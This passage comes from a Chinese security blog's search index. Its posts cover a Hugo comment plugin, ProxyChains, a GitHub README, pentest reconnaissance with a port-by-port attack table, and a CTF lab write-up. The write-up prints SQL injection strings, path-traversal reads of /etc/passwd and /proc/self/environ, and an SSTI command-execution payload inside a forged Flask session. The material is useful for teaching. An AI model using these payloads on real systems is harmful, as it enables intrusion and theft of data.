rel=\u0026#34;noopener noreferrer\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Hugo\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;\u0026amp;middot;\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;Theme \u0026lt;a href=\u0026#34;https://git.io/hugopapermod\u0026#34; rel=\u0026#34;noopener\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;PaperMod\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;script src=\u0026#34;https://utteranc.es/client.js\u0026#34; repo=\u0026#34;oopsdc/utterances\u0026#34; issue-term=\u0026#34;title\u0026#34; theme=\u0026#34;github-light\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; async\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/footer\u0026gt; 运行命令hugo server进入一篇文章即可查看评论插件效果。\n至此，utterances评论插件已成功部署。\n参数详解 在官方文档中，有不少的参数，如映射到issue的方式、issus标签、主题等，在选择完相应参数之后，会在Enable Utterances处自动生成配置代码，即上述代码。此处详解六种issus映射方式。\n Issue title contains page pathname  Utterances将搜索一个标题包含博客文章路径名URL组件的issue。如果没有找到匹配的issue，Utterances将在第一次发表评论时自动创建。\n Issue title contains page URL  Utterances将搜索一个标题包含博客文章URL的issue。如果没有找到匹配的issue，Utterances将在第一次发表评论时自动创建。\n Issue title contains page title  Utterances将搜索标题包含博客文章标题的issue。如果没有找到匹配的issue，Utterances将在第一次发表评论时自动创建。\n Issue title contains page og:title  Utterances将搜索一个标题包含页面的Open Graph标题元的issue。如果没有找到匹配的issue，Utterances将在第一次发表评论时自动创建。\n Specific issus number  手动配置Utterances来按编号加载一个特定的issue。issue不会被自动创建。\n Issue title contains specific term  手动将Utterances配置为搜索标题包含手动选择的特定术语的issue。如果没有找到匹配的issue，Utterances会在第一次发表评论时自动创建。该issue的标题将是你选择的术语。\n本文选择title方式，即对应评论会以文章标题作为issue标题在仓库下自动创建。\n 本文链接：自定义GitHub个人资料 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/utterances%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/","summary":"概述 utterances是一个基于GitHub issue，拥有多种主题的开源小组件，本文将简述使用如何在hugo博客部署utterances。\n配置过程 新建仓库 新建一个公开的仓库，用于存放评论，名字随意。作者在此处创建一个名为utterances的公开仓库。\n安装utterances GitHub Apps - utterances\n点击安装即可，选择仓库：\n安装完成后会自动跳转到官方页面。\n在文件中添加插件 官方文档:utterances\n修改footer.html文件，以PaperMod主题为例：\n\u0026lt;footer class=\u0026#34;footer\u0026#34;\u0026gt; {{- if .Site.Copyright }} \u0026lt;span\u0026gt;{{ .Site.Copyright | markdownify }}\u0026lt;/span\u0026gt; {{- else }} \u0026lt;span\u0026gt;\u0026amp;copy; {{ now.Year }} \u0026lt;a href=\u0026#34;{{ \u0026#34;\u0026#34; | absLangURL }}\u0026#34;\u0026gt;{{ .Site.Title }}\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; {{- end }} \u0026lt;span\u0026gt;\u0026amp;middot;\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;Powered by \u0026lt;a href=\u0026#34;https://gohugo.io/\u0026#34; rel=\u0026#34;noopener noreferrer\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;Hugo\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;\u0026amp;middot;\u0026lt;/span\u0026gt; \u0026lt;span\u0026gt;Theme \u0026lt;a href=\u0026#34;https://git.io/hugopapermod\u0026#34; rel=\u0026#34;noopener\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;PaperMod\u0026lt;/a\u0026gt;\u0026lt;/span\u0026gt; \u0026lt;script src=\u0026#34;https://utteranc.es/client.js\u0026#34; repo=\u0026#34;oopsdc/utterances\u0026#34; issue-term=\u0026#34;title\u0026#34; theme=\u0026#34;github-light\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34; async\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/footer\u0026gt; 运行命令hugo server进入一篇文章即可查看评论插件效果。","title":"utterances博客评论插件"},{"content":"概述 ProxyChains是一个Linux和Unix下的代理工具，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，且可配置多个代理。\nProxyChains通过用户自定义的代理列表强制连接指定的应用程序。\n本文简述kali下如何通过ProxyChains使用Windows主机代理。\n相关资料 GitHub项目地址 ProxyChains：haad/proxychains: proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: \u0026ldquo;user/pass\u0026rdquo; for SOCKS4/5, \u0026ldquo;basic\u0026rdquo; for HTTP. (github.com)\nProxyChains-ng：rofl0r/proxychains-ng: proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project. the sf.net page is currently not updated, use releases from github release page instead.\n参考文章 ProxyChains_freeking101的博客-CSDN博客_proxychains\nkali利用ProxyChains4配置使用主机代理 安装ProxyChains4 kali默认预装proxychains4，其它基于Debian的Linux发行版可通过如下命令安装：\napt-get install proxychains4 文件配置 vim /etc/proxychains4.conf\r取消dynamic_chain的注释以及注释掉strict_chain：\n注释掉原本的socks4 127.0.0.0 9050，并添加如下内容：\n此处的IP为ipconfig命令查询到的主机IPv4地址，端口则是代理软件对应的端口，此处以clash为例。\n注：请在代理软件上勾选允许本地网络连接选项。\n这一步做好之后，我们还需要更改主机的适配器选项。打开路径如下：\n设置→网络和Internet→状态→更改适配器设置→选择对应的网络设备(此处以WLAN为例)→属性→共享→Internet连接共享\n此处之所以选择VMnet8是因为虚拟机使用的NAT模式，如有不同请自行修改。\n以上步骤完成之后，在kali中执行如下命令打开浏览器访问某歌测试即可：\nproxychains4 firefox\r 本文链接：ProxyChains | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","summary":"概述 ProxyChains是一个Linux和Unix下的代理工具，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，且可配置多个代理。\nProxyChains通过用户自定义的代理列表强制连接指定的应用程序。\n本文简述kali下如何通过ProxyChains使用Windows主机代理。\n相关资料 GitHub项目地址 ProxyChains：haad/proxychains: proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: \u0026ldquo;user/pass\u0026rdquo; for SOCKS4/5, \u0026ldquo;basic\u0026rdquo; for HTTP. (github.com)\nProxyChains-ng：rofl0r/proxychains-ng: proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.","title":"ProxyChains简单使用"},{"content":"平台地址:N1BOOK平台-Nu1L Team\n第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:\nUser-agent: *\rDisallow:\r/flag1_is_her3_fun.txt\r访问flag1_is_her3_fun.txt，获得第一部分flag。\n剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。\n粗心的小李  Des:看看能不能找到信息吧?\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)\n使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。\nSQL注入 SQL注入-1  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 访问后发现URL如下：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=1\r猜测id是注入点。\n判断是否为数字型注入：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=1-1\r页面无变化，继续判断是否为字符型注入：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=1'\r页面错误，用联合查询看一下有几列数据：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=-1%27union%20select%201,2,3%23\r查库名：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23\r查表名：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23\r查字段：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/index.php?id=-1%27union%20select%201,fllllag,1%20from%20fl4g%23\rSQL注入-2  Des:请访问 http://127.0.0.1/login.php http://127.0.0.1/user.php\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-2:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 是一个后台登录页面，尝试账密admin/admin，显示账号或密码错误，尝试admin'/admin，显示账号不存在。猜测存在SQL注入，用延时函数判断一下注入类型：\nadmin' and sleep(5)#\r页面回显延时5秒，存在字符型注入。继续尝试万能密码，无法登录，正确思路应该不是登录，而是通过注入获得flag。\n使用bp抓包进行updatexml报错注入。\nURL：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/login.php?tips=1\r爆数据库名：\nname=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(table_name)from information_schema.tables where table_schema=database())),1)%23\u0026amp;pass=admin\r得到两个库名：\nfl4g\rusers\r爆表名：\nname=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(column_name)from information_schema.columns where table_name='fl4g')),1)%23\u0026amp;pass=admin\r得到一个表名：\nflag\r爆字段：\nname=admin' and updatexml(1,concat(0x7e,(seleselectct (flag)from fl4g)),1)%23\u0026amp;pass=admin\r任意文件读取漏洞 afr_1  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-1:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 访问页面，会自动添加一个?p=hello参数，尝试修改参数值，更改了几个值页面都是空白，猜测是读写文件。那么就看一看flag文件是否存在，存在，但是页面回显为no no no。\n猜测使用了php协议的filter机制，尝试一下：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/?p=php://filter/convert.base64-encode/resource=hello\r得到一个Base64编码的字符串，解码如下：\n\u0026lt;?php echo \u0026#34;hello world!\u0026#34;; 同理查看flag文件，获得flag。\nafr_2  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-2:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 页面源码如下：\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;u1s1\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; HELLO! \u0026lt;img src=\u0026#34;img/img.gif\u0026#34;\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 看看能否访问img目录，成功。看了一下网站服务，发现使用了nginx，那就有可能出现配置不当导致的目录穿越漏洞。\n尝试访问如下地址：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/img../\r获得flag。\nafr_3  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-3:latest ports: - 5000:5000 启动：\ndocker-compose up -d\r解题过程 网页是一个输入框，且能够进行XSS注入。\n点击提交按钮后继续点击超链接，跳转到一个实例文章页面，URL如下：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/article?name=article\r尝试修改name的值，本来想看看是否存在flag文件，结果打错为fkag，意外爆出了路径：\n继续尝试访问flag文件，显示没有权限。\n再看看能不能读取到其它文件：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/article?name=../../../etc/passwd\r还可以用以下姿势来得到更多的信息：\n/proc/sched_debug\t# 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用\r/proc/mounts\t# 挂载的文件系统列表\r/proc/net/arp\t# arp表，可以获得内网其他机器的地址\r/proc/net/route\t# 路由表信息\r/proc/net/tcp and /proc/net/udp # 活动连接的信息\r/proc/net/fib_trie\t# 路由缓存\r/proc/version\t# 内核版本\r/proc/[PID]/cmdline # 可能包含有用的路径信息\r/proc/[PID]/environ # 程序运行的环境变量信息，可以用来包含getshell\r/proc/[PID]/cwd\t# 当前进程的工作目录\r/proc/[PID]/fd/[#]\t# 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log\r读一下cmdline：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/article?name=../../../proc/self/cmdline\r回显为pythonserver.py，猜测题目为python环境，那么先使用cwd找一下server.py文件：\nhttp://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;/article?name=../../../proc/self/cwd/server.py\r回显如下：\n#!/usr/bin/python import os from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string ) from flask_session import Session app = Flask(__name__) execfile(\u0026#39;flag.py\u0026#39;) execfile(\u0026#39;key.py\u0026#39;) FLAG = flag app.secret_key = key @app.route(\u0026#34;/n1page\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def n1page(): if request.method != \u0026#34;POST\u0026#34;: return redirect(url_for(\u0026#34;index\u0026#34;)) n1code = request.form.get(\u0026#34;n1code\u0026#34;) or None if n1code is not None: n1code = n1code.replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;_\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;{\u0026#34;,\u0026#34;\u0026#34;).replace(\u0026#34;}\u0026#34;,\u0026#34;\u0026#34;) if \u0026#34;n1code\u0026#34; not in session or session[\u0026#39;n1code\u0026#39;] is None: session[\u0026#39;n1code\u0026#39;] = n1code template = None if session[\u0026#39;n1code\u0026#39;] is not None: template = \u0026#39;\u0026#39;\u0026#39;\u0026lt;h1\u0026gt;N1 Page\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;row\u0026gt; \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3 center\u0026#34;\u0026gt; Hello : %s, why you don\u0026#39;t look at our \u0026lt;a href=\u0026#39;/article?name=article\u0026#39;\u0026gt;article\u0026lt;/a\u0026gt;? \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026#39;\u0026#39;\u0026#39; % session[\u0026#39;n1code\u0026#39;] session[\u0026#39;n1code\u0026#39;] = None return render_template_string(template) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return render_template(\u0026#34;main.html\u0026#34;) @app.route(\u0026#39;/article\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def article(): error = 0 if \u0026#39;name\u0026#39; in request.args: page = request.args.get(\u0026#39;name\u0026#39;) else: page = \u0026#39;article\u0026#39; if page.find(\u0026#39;flag\u0026#39;)\u0026gt;=0: page = \u0026#39;notallowed.txt\u0026#39; try: template = open(\u0026#39;/home/nu11111111l/articles/{}\u0026#39;.format(page)).read() except Exception as e: template = e return render_template(\u0026#39;article.html\u0026#39;, template=template) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=False) 盲猜flag在flag.py里，但还是无权限访问，看看key.py，内容如下：\n#!/usr/bin/python key = \u0026#39;Drmhze6EPcv0fN_81Bj-nA\u0026#39; 通过插件发现网站使用flask框架，应该有SSTI模板注入，注意到server.py里的过滤语句：\nif n1code is not None: n1code = n1code.replace(\u0026#34;.\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;_\u0026#34;, \u0026#34;\u0026#34;).replace(\u0026#34;{\u0026#34;,\u0026#34;\u0026#34;).replace(\u0026#34;}\u0026#34;,\u0026#34;\u0026#34;) 还有下面的这两句：\nif \u0026#34;n1code\u0026#34; not in session or session[\u0026#39;n1code\u0026#39;] is None: session[\u0026#39;n1code\u0026#39;] = n1code template = None template = \u0026#39;\u0026#39;\u0026#39;\u0026lt;h1\u0026gt;N1 Page\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;row\u0026gt; \u0026lt;div class=\u0026#34;col-md-6 col-md-offset-3 center\u0026#34;\u0026gt; Hello : %s, why you don\u0026#39;t look at our \u0026lt;a href=\u0026#39;/article?name=article\u0026#39;\u0026gt;article\u0026lt;/a\u0026gt;? \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026#39;\u0026#39;\u0026#39; % session[\u0026#39;n1code\u0026#39;] 模板渲染的内容就是n1code，但n1code的来源可以为session，我们就可以利用flask的session伪造查看flag。\n伪造session需要一个密钥，密钥就是key.py中的那一个字符串。\nflask session加密脚本:noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)\n构造语句：\n{\u0026#39;n1code\u0026#39;: \u0026#39;{{\\\u0026#39;\\\u0026#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\\u0026#39;os\\\u0026#39;].popen(\\\u0026#39;cat flag.py\\\u0026#39;).read()}}\u0026#39;} 工具使用：\npython ./flask_session_cookie_manager3.py encode -s \u0026#34;Drmhze6EPcv0fN_81Bj-nA\u0026#34; -t \u0026#34;{\u0026#39;n1code\u0026#39;: \u0026#39;{{\\\u0026#39;\\\u0026#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\\u0026#39;os\\\u0026#39;].popen(\\\u0026#39;cat flag.py\\\u0026#39;).read()}}\u0026#39;}\u0026#34; .eJwdikEKgCAQAL8SX1YvQ12CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAP1jNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWad0PkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X6pHGQ.HTAUFHnMrWWCCfiRJXBNyUdj4IY 发包：\n第二章 Web进阶 SSRF漏洞 SSRF Training  Des:\nweb容器中存在一个flag，mysql中存在一个管理员账号密码，其余容器中均没有特定flag\nmysql容器中内置 tcpdump\nvulnweb容器中内置一个 fpm.py 攻击脚本\n 环境搭建 docker-compose.yml：\nversion: \u0026#34;3\u0026#34; services: web: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-1:latest depends_on: - redis - vuln - mysql ports: - \u0026#34;80:80\u0026#34; redis: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-2:latest vuln: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-3:latest mysql: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-4:latest environment: - MYSQL_RANDOM_ROOT_PASSWORD=yes 启动：\ndocker-compose up -d\r解题过程 想直接访问flag.php，直接就出来了：\nhttp://127.0.0.1/flag.php\r正确思路应该是利用URL解析差异，如：\nhttp://x@127.0.0.1:80@google.com/flag.php\r进入safe_request_curl后，curl获取到的是127.0.0.1:80/flag.php，parse_url获取到的host是google.com，利用解析差异实现SSRF攻击。\n 本文链接：从0到1-CTFer成长之路 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/","summary":"平台地址:N1BOOK平台-Nu1L Team\n第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:\nUser-agent: *\rDisallow:\r/flag1_is_her3_fun.txt\r访问flag1_is_her3_fun.txt，获得第一部分flag。\n剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。\n粗心的小李  Des:看看能不能找到信息吧?\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)\n使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。\nSQL注入 SQL注入-1  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.","title":"从0到1-CTFer成长之路"},{"content":"概述 想自定义一下GitHub的个人资料自述文件，遂有本文。\n官方文档:管理个人资料自述文件 - GitHub Docs\n关于自述文件:关于自述文件 - GitHub Docs\n基本要求  创建一个与用户名相同的公开仓库 仓库根目录包含README.md文件 README.md文件不能为空  实现步骤 1.添加个人资料自述文件 1.新建仓库 在任意页面点击右上角的+号创建一个与自己用户名相同的仓库。当输入自己的用户名时，会出现一个小彩蛋。\n2.添加仓库说明(可选) 3.设置仓库为公共属性 4.使用自述文件初始化仓库 5.创建仓库并编辑README文档 生成的自述文件已由模板预先填充，也可自定义表情、符号。\n表情符号清单:🎁 Emoji cheat sheet for GitHub, Basecamp, Slack \u0026amp; more (webfx.com)\n在想要换行的文本前后加上\u0026lt;br\u0026gt;和\u0026lt;/br\u0026gt;即可，如:\n\u0026lt;br\u0026gt;This is test\u0026lt;/br\u0026gt; 2.删除个人资料自述文件 以下任一满足，个人资料自述文件就将会被删除:\n 自述文件为空或不存在 仓库为私有仓库 仓库名与用户名不匹配   本文链接：自定义GitHub个人资料 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","permalink":"https://oopsdc.com/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/","summary":"概述 想自定义一下GitHub的个人资料自述文件，遂有本文。\n官方文档:管理个人资料自述文件 - GitHub Docs\n关于自述文件:关于自述文件 - GitHub Docs\n基本要求  创建一个与用户名相同的公开仓库 仓库根目录包含README.md文件 README.md文件不能为空  实现步骤 1.添加个人资料自述文件 1.新建仓库 在任意页面点击右上角的+号创建一个与自己用户名相同的仓库。当输入自己的用户名时，会出现一个小彩蛋。\n2.添加仓库说明(可选) 3.设置仓库为公共属性 4.使用自述文件初始化仓库 5.创建仓库并编辑README文档 生成的自述文件已由模板预先填充，也可自定义表情、符号。\n表情符号清单:🎁 Emoji cheat sheet for GitHub, Basecamp, Slack \u0026amp; more (webfx.com)\n在想要换行的文本前后加上\u0026lt;br\u0026gt;和\u0026lt;/br\u0026gt;即可，如:\n\u0026lt;br\u0026gt;This is test\u0026lt;/br\u0026gt; 2.删除个人资料自述文件 以下任一满足，个人资料自述文件就将会被删除:\n 自述文件为空或不存在 仓库为私有仓库 仓库名与用户名不匹配   本文链接：自定义GitHub个人资料 | Atmet (oopsdc.tk)\n文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","title":"自定义GitHub个人资料"},{"content":"信息收集概念 进行渗透测试之前，最重要的一步就是信息收集。\n信息收集的主要内容:收集服务器配置信息、网站敏感信息等，包括域名、子域名信息、目标网站系统CMS指纹、目标网站真实IP、开放端口等。\n1、收集域名信息 知道目标域名后，第一件事就是获取域名注册信息，包括域名DNS服务器信息及注册人联系信息等。\nWhois命令查询 概念:Whois是一个标准互联网协议，可用于收集网络注册信息，如注册域名、IP等。\n原理:Whois就是一个用于查询域名是否被注册及注册域名详细信息的数据库。\n作用:获得注册人姓名和邮箱，通过社工进一步获取其它信息。\n用法：\nwhois baidu.com\t在线Whois查询网站：\n站长工具_whois查询工具_爱站网 (aizhan.com)\n域名Whois查询 - 站长之家 (chinaz.com)\nVirusTotal\n2、查询备案信息 概念:网站备案是工具国家法律法规规定，需要网站所有者向国家有关部门申请的备案。这是国家信息产业部对网站的一种管理。\n注意:若网站搭建在其他国家，则不需进行备案。\n在线备案信息查询网站：\n天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)\n3、收集敏感信息 搜索关键字 通过搜索引擎构造特殊关键字语法来搜索互联网上的相关敏感信息。还可用其来收集数据库文件、SQL注入、配置信息、源码泄露、未授权访问和robots.txt等敏感信息。\n常用搜索语法(各搜索引擎大同小异)：\n   语法 作用     Site 指定域名   Inurl URL存在关键字的网页   Intext 网页正文中的关键字   Filetype 指定文件类型   Intitle 网页标题中的关键字   link link:baidu.com 表示返回所有和baidu.com做了链接的URL   Info 查找指定站点的基本信息   cache 搜索Google中关于某些内容的缓存    一般可以把语法结合使用以获得更准确的信息。\n使用Burp Suite的Repeater模块 将抓到的包发送至Repeater模块，查看服务器端的响应包。可以获得一些服务器信息，如Server类型及版本、PHP版本信息等。\nGitHub信息泄露 可以尝试在GitHub上搜寻敏感信息，如数据库连接信息、uc-key、阿里osskey、邮箱帐密等。\n4、收集子域名 子域名，即二级域名，指顶级域名之下的域名。假设目标网站规模较大，一般来说从主站入手都是极不理智的选择，这时我们就可以考虑从子域迂回接近目标。\n子域名检测工具 Layer子域名挖掘机：较为常用，有域名、解析IP、CDN列表、Web服务器和网站状态。\nsubDomainBrute：用小字典递归发现三级、四级甚至是五级域名。\nSublist3r：能列举多种资源，如在Google、Yahoo、Bing、Baidu和Ask等搜索引擎中可查到的子域名，还可列出Netcraft、VirusTota、ThreatCrow、DNSdumpster和Reverse DNS查到的子域名。\n利用搜索引擎语法 利用site语法搜索与某域名相关的网页信息。\n证书透明度公开日志枚举 证书透明度（Certificate Transparency, CT）:是证书授权机构(CA)的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。\nSSL/TLS证书通常包含域名、子域名和邮件信息，这些也经常成为攻击者想获得的信息。\n在线网站：\neasyDNS Parked Page for: scrt.sh\nCensys Search\n5、端口收集 通过扫描服务器开放端口及端口状态判断服务器存在的服务，进一步定制化攻击。\n收集工具:\nNmap\n无状态端口扫描工具Masscan\nZMap\n御剑高速TCP端口扫描工具\n常见端口及说明 文件共享服务端口:\n   端口号 端口说明 攻击思路     21/22/69 Ftp/Tftp文件传输协议 允许匿名上传、下载、爆破和嗅探操作   139 Samba服务 爆破、未授权访问、远程代码执行   389 Ldap目录访问协议 注入、允许匿名访问、弱口令   2049 Nfs服务 配置不当    远程连接服务端口:\n   端口号 端口说明 攻击思路     22 SSH远程连接 爆破、文件传输、SSH隧道及内网代理转发   23 Telnet远程连接 爆破、嗅探、弱口令   3389 Rdp远程桌面连接 爆破、Shift(Windows Server 2k3以下系统)   5632 PyAnywhere 抓取密码、代码执行   5900 VNC 弱口令爆破    Web应用服务端口:\n   端口号 端口说明 攻击思路     80/443/8080 常见Web服务端口 爆破、Web攻击、对应服务器版本漏洞   1352 Lotus domino邮件服务 爆破、弱口令、信息泄露   4848 Glassfish控制台 弱口令   7001/7002 WebLogic控制台 弱口令、Java反序列化   8080/8089 Jboss/Resin/Jetty/Jenkins 反序列化、控制台弱口令   9090 WebSphere控制台 弱口令、Java反序列化   10000 Webmin-Web控制面板 弱口令    数据库服务端口:\n   端口号 端口说明 攻击思路     1433 MSSQL 注入、提权、爆破、SA弱口令   1521 Oracle 注入、TNS爆破、反弹shell   3306 MySQL 注入、提权、爆破   5000 SysBase/DB2 爆破、注入   5432 PostgreSQL 爆破、注入、弱口令   6379 Redis 弱口令爆破、未授权访问   27017/27018 MongoDB 爆破、未授权访问    邮件服务端口：\n   端口号 端口说明 攻击思路     25 SMTP邮件服务 邮件伪造   110 POP3协议 爆破、嗅探   143 IMAP协议 爆破    常见协议端口：\n   端口号 端口说明 攻击思路     53 DNS域名系统 域传送、缓存投毒、DNS欺骗、DNS劫持   67/68 DHCP服务 欺骗、劫持   161 SNMP协议 爆破、搜索目标内网信息    特殊服务端口：\n   端口号 端口说明 攻击思路     512/513/514 Linux Rexec服务 爆破、Rlogin登录   873 Rsync服务 匿名访问、文件上传   2181 Zookeeper服务 未授权访问   3690 Svn服务 Svn泄露、未授权访问   8069 Zabbix服务 远程执行、SQL注入   9200/9300 Elasticsearch服务 远程执行   11211 Memcache服务 未授权访问   50000 SAP Management Console 远程执行    6、指纹识别(CMS) 注意:指纹由于其终身不变性、唯一性和方便性，几乎已成为生物特征识别的代名词。本文所讲的指纹是指网站CMS指纹识别、计算机操作系统及Web容器指纹识别等。\n概念:应用程序一般在HTML、CSS等文件中多少包含一些特征码，如WordPress在robots.txt中会包含wp-admin，index.php中会包含generator=wordpress 